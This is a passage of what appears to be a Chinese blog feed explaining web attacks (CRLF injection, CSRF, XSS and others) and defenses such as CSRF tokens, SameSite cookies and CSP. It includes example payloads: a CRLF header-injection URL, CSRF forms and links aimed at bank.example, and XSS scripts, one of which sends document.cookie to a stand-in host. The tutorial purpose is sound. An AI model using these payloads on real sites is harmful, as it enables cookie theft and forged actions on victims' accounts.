title="国际化域名字形欺骗攻击"></a>国际化域名字形欺骗攻击</h3><p>利用一些语系字母外形和英文字母外形几乎一样的特性，从而欺骗受害者的视觉判断的攻击形式。例如常见的字母“o”就有许多编码不同，但是外观一样的“哦”</p><h3 id="攻击HTML标注化过程绕过-XSS-FILTER"><a href="#攻击HTML标注化过程绕过-XSS-FILTER" class="headerlink" title="攻击HTML标注化过程绕过 XSS FILTER"></a>攻击HTML标注化过程绕过 XSS FILTER</h3><p>攻击者借助代理服务器生成指向受害主机的合法请求，实现DDOS和伪装就叫：CC(ChallengeCollapsar)。</p><p>CC攻击可以归为DDoS攻击的一种。他们之间的原理都是一样的，即发送大量的请求数据来导致服务器拒绝服务，是一种连接攻击。CC攻击又可分为代理CC攻击，和肉鸡CC攻击。</p><h3 id="CRLF攻击"><a href="#CRLF攻击" class="headerlink" title="CRLF攻击"></a>CRLF攻击</h3><p>CRLF是回车换行的意思。CRLF攻击实际是个代码注入性的漏洞。</p><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><p>例子<br>一般网站会在HTTP头中用Location: <a href="http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。" target="_blank" rel="noopener">http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</a></p><p>所以一个正常的302跳转包是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily </span><br><span class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location: http://www.sina.com.cn</span><br></pre></td></tr></table></figure><p>但如果我们输入的是  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun</span><br></pre></td></tr></table></figure><p>注入了一个换行，此时的返回包就会变成这样： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily </span><br><span class="line">Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location: http://www.sina.com.cn </span><br><span class="line">Set-cookie: JSPSESSID=wooyun</span><br></pre></td></tr></table></figure><p>这个时候这样我们就给访问者设置了一个SESSION，造成一个“会话固定漏洞”。</p><blockquote><p>%0a 换行符</p></blockquote><p><strong><em>办法:</em></strong><br>如何修复HRS漏洞，当然是过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。</p><p><a href="https://blog.csdn.net/think_ycx/article/details/50267801" target="_blank" rel="noopener">https://blog.csdn.net/think_ycx/article/details/50267801</a></p><h3 id="重放攻击-Replay-Attacks"><a href="#重放攻击-Replay-Attacks" class="headerlink" title="重放攻击(Replay Attacks)"></a>重放攻击(Replay Attacks)</h3><p>又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。</p><h3 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h3><p>又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>Man-in-the-MiddleAttack，简称“MITM攻击”</p><p>很多种中间人</p><p>SMB会话劫持、DNS欺骗、会话劫持、</p><p>包括http中间人、https中间人。难以不同而已。很多分类</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>中间人攻击的一种。</p><h3 id="DDoS攻击"><a href="#DDoS攻击" class="headerlink" title="DDoS攻击"></a>DDoS攻击</h3><p>DoS攻击、DDoS攻击和DRDoS等分布式拒绝服务</p><h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h3><p>攻击者借助代理服务器生成指向受害主机的合法请求，实现DDOS和伪装就叫：CC(ChallengeCollapsar)。</p><h3 id="移动端的安全问题"><a href="#移动端的安全问题" class="headerlink" title="移动端的安全问题"></a>移动端的安全问题</h3><ul><li>通用跨站脚本攻击(UXSS) </li></ul><blockquote><p>是利用浏览器或者浏览器中插件的漏洞，讲本该被同源策略拦截的脚本或代码注入到一个任意网站中。</p></blockquote><ul><li>地址栏伪造</li><li>界面伪装</li></ul><h3 id="还有很多"><a href="#还有很多" class="headerlink" title="还有很多~~~"></a>还有很多~~~</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一切都是不够安全的。因为不相信，所以看见。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;我们遇到的一些问题&quot;&gt;&lt;a href=&quot;#我们遇到的一些问题&quot; class=&quot;headerlink&quot; title=&quot;我们遇到的一些问题&quot;&gt;&lt;/a&gt;我们遇到的一些问题&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;菜鸟组件由lodop更为clodop&lt;/li&gt;
&lt;/ul&gt;
&lt;block
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>CSRF</title>
    <link href="http://swingboy.github.io/2018/11/23/CSRF/"/>
    <id>http://swingboy.github.io/2018/11/23/CSRF/</id>
    <published>2018-11-23T14:32:37.000Z</published>
    <updated>2019-11-23T14:30:12.488Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h3><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><h5 id="一个典型的CSRF攻击流程："><a href="#一个典型的CSRF攻击流程：" class="headerlink" title="一个典型的CSRF攻击流程："></a>一个典型的CSRF攻击流程：</h5><p>受害者登录a.com，并保留了登录凭证（Cookie）。<br>攻击者引诱受害者访问了b.com。<br>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。<br>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。<br>a.com以受害者的名义执行了act=xx。<br>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。  </p><p><img src="./img/CSRF攻击.jpg" alt="avatar"></p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h4><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example/withdraw?amount=10000&amp;for=hacker&quot; &gt;</span><br></pre></td></tr></table></figure><p>在受害者访问含有这个img的页面后，浏览器会自动向<a href="http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。" target="_blank" rel="noopener">http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</a></p><h4 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h4><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;form action=&quot;http://bank.example/withdraw&quot; method=POST&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;xiaoming&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><blockquote><p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p></blockquote><h4 id="链接类型的CSRF"><a href="#链接类型的CSRF" class="headerlink" title="链接类型的CSRF"></a>链接类型的CSRF</h4><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot; taget=&quot;_blank&quot;&gt;</span><br><span class="line">  重磅消息！！</span><br><span class="line">&lt;a/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。</p></blockquote><h4 id="总结出CSRF的特点"><a href="#总结出CSRF的特点" class="headerlink" title="总结出CSRF的特点"></a>总结出CSRF的特点</h4><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><blockquote><p>CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p></blockquote><h3 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h3><p>基于CSRF的两个特点：</p><ul><li>CSRF（通常）发生在第三方域名。</li><li>CSRF攻击者不能获取到Cookie等信息，只是使用。</li></ul><p>针对这两点，我们可以专门制定防护策略，如下：</p><ul><li><p>阻止不明外域的访问</p><ul><li>同源检测</li><li>Samesite Cookie</li></ul></li><li><p>提交时要求附加本域才能获取的信息</p><ul><li>CSRF Token</li><li>双重Cookie验证</li></ul></li></ul><h4 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h4><p>在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名：</p><ul><li>Origin Header</li><li>Referer Header</li></ul><p>但是，Origin在以下两种情况下并不存在：</p><ul><li><p>IE11同源策略： IE 11不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同</p></li><li><p>302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</p></li></ul><p><strong><em>referer了解下：</em></strong><br>对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p><p>在以下情况下Referer没有或者不可信：</p><ul><li>IE6、7下使用window.location.href=url进行界面的跳转，会丢失Referer。  </li><li>IE6、7下使用window.open，也会缺失Referer。  </li><li>HTTPS页面跳转到HTTP页面，所有浏览器Referer都丢失。  </li><li>点击Flash上到达另外一个网站的时候，Referer的情况就比较杂乱，不太可信。  </li></ul><p><strong><em>Host、Origin、Referer区别了解下：</em></strong></p><ul><li><p>Host：描述请求将被发送的目的地，包括，且仅仅包括域名和端口号。<br>在任何类型请求中，request都会包含此header信息。</p></li><li><p>Origin：用来说明请求从哪里发起的，包括，且仅仅包括协议和域名。<br>这个参数一般只存在于CORS跨域请求中，可以看到response有对应的header：Access-Control-Allow-Origin。</p></li><li><p>Referer：告知服务器请求的原始资源的URI，其用于所有类型的请求，并且包括：协议+域名+查询参数（注意，不包含锚点信息）。</p></li></ul><h4 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h4><p>SameSite Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止CSRF。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。</p><h4 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h4><p>让我们想到了登录验证的问题。</p><p>思路：CSRF攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合（显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用）因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><hr><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ul><li>将CSRF Token输出到页面中</li><li>页面提交的请求携带这个Token</li><li>服务器验证Token是否正确</li></ul><p><strong><em>分布式校验了解下:</em></strong></p><p>在大型站点，使用Session存储CSRF Token会带来很大的压力。</p><p>访问单台服务器session是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的HTTP请求通常要经过像Ngnix之类的负载均衡器之后，再路由到具体的服务器上，由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。</p><p>由于使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题。</p><p>目前很多网站采用Encrypted Token Pattern方式。这种方法的Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。</p><blockquote><p>这种Token的值通常是使用UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。</p></blockquote><p><strong><em>双重Cookie验证了解下：</em></strong></p><p>在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。</p><p>那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。</p><blockquote><p>每个请求最好都要修改cookies</p></blockquote><h4 id="防止网页被Frame"><a href="#防止网页被Frame" class="headerlink" title="防止网页被Frame"></a>防止网页被Frame</h4><p>我们通过在服务端设置HTTP头部中的X-Frame-Options信息，防止网页被Frame。<br>X-Frame-Options 响应头有三个可选的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DENY：页面不能被嵌入到任何iframe或frame中；</span><br><span class="line">SAMEORIGIN：页面只能被本站页面嵌入到iframe或者frame中；</span><br><span class="line">ALLOW-FROM：页面允许frame或frame加载。</span><br></pre></td></tr></table></figure><p>在服务端设置的方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java代码: response.addHeader(&quot;x-frame-options&quot;,&quot;SAMEORIGIN&quot;);</span><br><span class="line">Nginx配置: add_header X-Frame-Options SAMEORIGIN</span><br><span class="line">Apache配置: Header always append X-Frame-Options SAMEORIGIN</span><br></pre></td></tr></table></figure><h4 id="CSRF测试"><a href="#CSRF测试" class="headerlink" title="CSRF测试"></a>CSRF测试</h4><p>通过CSRF测试。</p><blockquote><p>CSRFTester是一款CSRF漏洞的测试工具</p></blockquote><h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>Content-Security-Policy 内容安全策略。</p><p>CSP是一种由开发者定义的安全性政策性申明，通过CSP所约束的的规责指定可信的内容来源（可以指脚本、图片、iframe、fton、style等可能的远程资源）。通过CSP协定，让WEB处于一个安全的运行环境中。</p><p>为了使CSP可用, 你需要配置你的服务器返回 Content-Security-Policy HTTP头部</p><p><strong><em>示例:</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; 只允许同源下的资源</span><br><span class="line">script-src &apos;self&apos;;只允许同源下的js</span><br><span class="line">script-src &apos;self&apos; www.google-analytics.com ajax.googleapis.com;允许同源以及两个地址下的js加载</span><br><span class="line">default-src &apos;none&apos;; script-src &apos;self&apos;; connect-src &apos;self&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;;多个资源时,后面的会覆盖前面</span><br></pre></td></tr></table></figure><p>当然你还可以再meta中使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; img-src https://*; child-src &apos;none&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure><p>还可以启用发送违规报告，你需要指定 report-uri 策略指令，并提供至少一个URI地址去递交报告：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; report-uri http://reportcollector.example.com/collector.cgi</span><br></pre></td></tr></table></figure><p>作为报告的JSON对象报告包含了以下数据：</p><ul><li>document-uri 发生违规的文档的URI。</li><li>referrer 违规发生处的文档引用（地址）。</li><li>blocked-uri  被CSP阻止的资源URI。如果被阻止的URI来自不同的源而非文档URI，那么被阻止的资源URI会被删减，仅保留协议，主机和端口号。</li><li>violated-directive 违反的策略名称。</li><li>original-policy 在 Content-Security-Policy HTTP 头部中指明的原始策略。</li></ul><p>样本： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; style-src cdn.example.com; report-uri /_/csp-reports</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;什么是CSRF&quot;&gt;&lt;a href=&quot;#什么是CSRF&quot; class=&quot;headerlink&quot; title=&quot;什么是CSRF&quot;&gt;&lt;/a&gt;什么是CSRF&lt;/h3&gt;&lt;p&gt;CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://swingboy.github.io/2018/11/23/XSS/"/>
    <id>http://swingboy.github.io/2018/11/23/XSS/</id>
    <published>2018-11-23T14:32:05.000Z</published>
    <updated>2019-11-23T14:31:08.198Z</updated>
    
    <content type="html"><![CDATA[<h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h4><p>XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞。</p><p>XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p><img src="./img/xss危害.png" alt></p><p>这么多~~</p><h4 id="有哪些注入的方法和途径："><a href="#有哪些注入的方法和途径：" class="headerlink" title="有哪些注入的方法和途径："></a>有哪些注入的方法和途径：</h4><ul><li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li><li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li><li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li><li>在标签的 href、src 等属性中，包含 javascript: 等可执行代码。</li><li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li><li>在 style 属性和标签中，包含类似 background-image:url(“javascript:…”); 的代码（新版本浏览器已经可以防范）。</li><li>在 style 属性和标签中，包含类似 expression(…) 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li></ul><blockquote><p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p></blockquote><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="1、反射型xss攻击"><a href="#1、反射型xss攻击" class="headerlink" title="1、反射型xss攻击"></a>1、反射型xss攻击</h5><p>又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</p><p>反射型ＸＳＳ也被称为非持久性ＣＳＳ。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成ＸＳＳ漏洞。这个过程就像一次反射，故称为反射型ＸＳＳ。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正常发送消息：</span><br><span class="line"></span><br><span class="line">http://www.test.com/message.php?send=Hello,World！</span><br><span class="line"></span><br><span class="line">接收者将会接收信息并显示Hello,Word</span><br><span class="line"></span><br><span class="line">非正常发送消息：</span><br><span class="line"></span><br><span class="line">http://www.test.com/message.php?send=&lt;script&gt;aldert(‘foolish!’)&lt;/script&gt;！</span><br><span class="line"></span><br><span class="line">接收者接收消息显示的时候将会弹出警告窗口</span><br></pre></td></tr></table></figure><h5 id="2、存储型xss攻击"><a href="#2、存储型xss攻击" class="headerlink" title="2、存储型xss攻击"></a>2、存储型xss攻击</h5><p>Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。</p><p>a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。</p><p>Stored XSS漏洞危害性更大，危害面更广。</p><h5 id="3、DOMBasedXSS（基于dom的跨站点脚本攻击）"><a href="#3、DOMBasedXSS（基于dom的跨站点脚本攻击）" class="headerlink" title="3、DOMBasedXSS（基于dom的跨站点脚本攻击）"></a>3、DOMBasedXSS（基于dom的跨站点脚本攻击）</h5><p>基于DOM的XSS有时也称为type0XSS。当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。</p><p>通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。</p><p>前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。<br>　　<br>var pos= document.URL.indexOf(“name=”)+5;</p><p>var len = document.URL.substring(pos,document.URL.length);  </p><p>document.write(len);  </p><blockquote></blockquote><p>这个页面，name是截取URL中get过来的name参数<br>正常操作：<br><a href="http://www.vulnerable.site/welcome.html?name=Joe" target="_blank" rel="noopener">http://www.vulnerable.site/welcome.html?name=Joe</a><br>非正常操作：<br><a href="http://www.vulnerable.site/welcome.html?name=" target="_blank" rel="noopener">http://www.vulnerable.site/welcome.html?name=</a><script>a1lert(document.cookie)</script></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="类似这些操作要小心"><a href="#类似这些操作要小心" class="headerlink" title="类似这些操作要小心"></a>类似这些操作要小心</h4><p>innerHTML、.outerHTML、document.write()</p><h4 id="HTML-Encode"><a href="#HTML-Encode" class="headerlink" title="HTML Encode"></a>HTML Encode</h4><p>用户将数据提交上来的时候进行HTML编码，将相应的符号转换为实体名称再进行下一步的处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如用户输入：&lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt;，保存后最终存储的会是：&amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</span><br></pre></td></tr></table></figure><h4 id="过滤或移除特殊的Html标签"><a href="#过滤或移除特殊的Html标签" class="headerlink" title="过滤或移除特殊的Html标签"></a>过滤或移除特殊的Html标签</h4><p>例如: &lt;script&gt;, &lt;iframe&lt; , &lt; for &lt;, &gt; for &gt;, &amp;quot for</p><h5 id="过滤JavaScript-事件的标签"><a href="#过滤JavaScript-事件的标签" class="headerlink" title="过滤JavaScript 事件的标签"></a>过滤JavaScript 事件的标签</h5><p>例如 “onclick=”, “onfocus” 等等。</p><h4 id="将重要的cookie标记为http-only"><a href="#将重要的cookie标记为http-only" class="headerlink" title="将重要的cookie标记为http only"></a>将重要的cookie标记为http only</h4><p>这样的话Javascript 中的document.cookie语句就不能获取到cookie了.</p><h4 id="表单数据规定值的类型"><a href="#表单数据规定值的类型" class="headerlink" title="表单数据规定值的类型"></a>表单数据规定值的类型</h4><p>例如：年龄应为只能为int、name只能为字母数字组合</p><blockquote><p>这里有个国人写的xss过滤的  <a href="https://jsxss.com/zh/index.html" target="_blank" rel="noopener">https://jsxss.com/zh/index.html</a></p></blockquote><h4 id="Secure标记"><a href="#Secure标记" class="headerlink" title="Secure标记"></a>Secure标记</h4><p>标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。</p><h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><p>让浏览器去做xss筛选，起到保护作用。</p><p>只要在HTTP响应报文的头部增加一个X-XSS-Protection 字段，明确地告诉浏览器XSS filter/auditor该如何工作。 </p><p>X-XSS-Protection 的字段有三个可选配置值：</p><ul><li>0： 表示关闭浏览器的XSS防护机制</li><li>1：删除检测到的恶意代码，如果响应报文中没有看到X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置</li><li>1; mode=block：如果检测到恶意代码，在不渲染恶意代码</li></ul><h3 id="浏览器XSS过滤策略"><a href="#浏览器XSS过滤策略" class="headerlink" title="浏览器XSS过滤策略"></a>浏览器XSS过滤策略</h3><p>从IE8 开始，IE 浏览器内置了一个针对XSS攻击的防护机制，这个浏览器内置的防护机制就是所谓的XSS filter，这个防护机制主要用于减轻反射型XSS 攻击带来的危害。 基于Webkit 内核的浏览器（比如Chrome）随后也增加一个名为XSS auditor 的防护机制，作用和IE中的XSS filter类似。这两种XSS防护机制的目的都很简单，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来，当然了，浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。</p><p>怎么设置策略。看上面“X-XSS-Protection”</p><hr><p>IE引入的XSS 